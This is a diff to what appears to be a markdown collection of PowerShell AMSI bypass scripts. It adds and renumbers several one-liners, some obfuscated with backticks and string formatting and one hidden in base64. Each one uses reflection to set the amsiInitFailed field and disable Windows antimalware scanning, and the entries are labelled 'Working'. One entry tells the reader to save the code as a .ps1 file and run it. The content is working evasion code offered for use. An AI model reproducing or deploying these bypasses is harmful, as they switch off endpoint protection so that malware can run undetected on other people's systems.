@@ -123,14 +123,28 @@ $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('
 $t=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); if($t){$f=$t.GetField('amsiInitFailed','NonPublic,Static'); $target=$null; $value=$true; if($f){"AMSI Bypass Patch Applied Successfully!"; $f.SetValue($target,$value)} else {"Field missing"}} else {"Type missing"}
 ```
 
+### **9. AMSI Bypass Script [Obfuscated one-liner (most reliable)] (Working)**
+```bash
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
 
-### **9. AMSI Bypass Script  [One Liner] (Work On Old/Unpatch Versions)**
+### **10. AMSI Bypass Script [Base64 encoded One Liner for filtered environments] (Working)**
+```bash
+[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
+```
+
+### **11. AMSI Bypass Script [PowerShell 6+ One Liner] (Working)**
+```bash
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+### **12. AMSI Bypass Script  [Obfuscated One Liner] (Work On Old/Unpatch Versions {Windows 24h2})**
 ```bash
 S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} ); Write-Output "AMSI Bypass Patch Applied Successfully!"
 ```
 
 
-### **10. AMSI Bypass Script  [copy this script  ans save it as .ps1 file and run in powershell] (Work On Old/Unpatch Versions)**
+### **13. AMSI Bypass Script  [copy this script  ans save it as .ps1 file and run in powershell] (Work On Old/Unpatch Versions)**
 ```bash
 $A=[Ref].Assembly.GetType((([char]65)+([char]109)+([char]115)+([char]105)+([char]85)+([char]116)+([char]105)+([char]108)+([char]115))
 )
